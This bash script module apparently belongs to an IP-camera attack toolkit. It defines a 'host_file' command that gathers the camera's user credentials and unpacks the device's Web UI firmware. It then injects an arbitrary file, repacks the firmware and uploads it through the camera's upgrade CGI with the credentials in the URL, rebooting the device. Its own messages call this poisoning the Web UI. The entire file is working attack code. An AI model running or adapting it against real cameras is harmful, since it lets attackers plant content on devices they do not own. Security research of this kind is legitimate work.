#!/bin/bash
#
# Copyright 2013 Artem Harutyunyan, Sergey Shekyan
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

# Add command to the array
export CMD_LIST=("${CMD_LIST[@]}" host_file)

validate_uiextract()
{
    UIEXTRACT=$(which uiextract)
    [[ -z $UIEXTRACT ]] &&  die "uiextract not found in \$PATH"
}

validate_uipack()
{
    UIPACK=$(which uipack)
    [[ -z $UIPACK ]] && die "uipack not found in \$PATH"
}

validate_host_file()
{
    validate_curl
    validate_lib
    validate_get_users
    validate_uiextract
    validate_uipack
    run_get_users
    get_webui_version
   
    if [[ -z $HOST_FILE ]] || [[ ! -f $HOST_FILE ]]; then
        die "A file for uploading to the camera must be provided and must exist. See -h for details"
    fi

    HOST_FILE_SIZE_LIMIT=50000
    HOST_FILE_SIZE=$(stat -c "%s" $HOST_FILE)
    [[ $HOST_FILE_SIZE -lt $HOST_FILE_SIZE_LIMIT ]] || die "The size of a file to upload can not exceed $HOST_DILE_FIZE_LIMIT"
}

run_host_file()
{    
    validate_host_file
    
    TEMPFILE=$(tempfile)

    # Locate Web UI
    WEBUI_FILE=$SYS_FW_LIB/web/$WEBUI_VERSION/$WEBUI_VERSION.bin
    [[ -f $WEBUI_FILE ]] || die "$WEBUI_FILE does not exist. Aborting run_poison_webui"
    green "Found matching Web UI version"
   
    # Verify integrity of Web UI   
    $UIEXTRACT -c $WEBUI_FILE
    [[ $? == 0 ]] || die "Could not verify integrity of $WEBUI_FILE"
    green "Verified the integrity of Web UI"

    # Create temporary directory 
    TMP_WEBUI_ROOT=/tmp/webui$SUFFIX/
    mkdir -p $TMP_WEBUI_ROOT
    ORIG_WEBUI_DIR=$TMP_WEBUI_ROOT/orig

    # Extract webui 
    $UIEXTRACT -x $WEBUI_FILE -o $ORIG_WEBUI_DIR >/dev/null 2>&1
    [[ $? == 0 ]] || die "Could not extract Web UI from $WEBUI_FILE"
    green "Successfully extracted Web UI firmware"
    
    # Add file  
    green "file to add is $HOST_FILE"
    cd $ORIG_WEBUI_DIR
    cp $HOST_FILE . 

    # Pack Web UI and verify integrity
    NEW_WEBUI_FNAME=$WEBUI_VERSION.bin
    NEW_WEBUI_FILE=$TMP_WEBUI_ROOT/$NEW_WEBUI_FNAME
    cd $ORIG_WEBUI_DIR
    $UIPACK -d . -o $NEW_WEBUI_FILE
    cd -
    $UIEXTRACT -c $NEW_WEBUI_FILE
    [[ $? == 0 ]] || die "Could not verify integrity of $NEW_WEBUI_FILE"
    green "Created Web UI package with an added file"

    # Upload Web UI to the camera
    CODE=$($CURL -s -o $TEMPFILE -w "%{http_code}" \
        -F "file=@$NEW_WEBUI_FILE;filename=$NEW_WEBUI_FNAME;type=application/binary" \
        $ADDR/upgrade_htmls.cgi'?next_url=reboot.htm&user='$USERNAME'&pwd='$PASSWORD)
    [[ $CODE == 200 ]] || die "Uploading Web UI to $ADDR failed $CODE $TEMPFILE"
    green "Successfully uploaded Web UI and rebooted $ADDR"
    
    # Cleanup
    rm -rf $TMP_WEBUI_ROOT
}


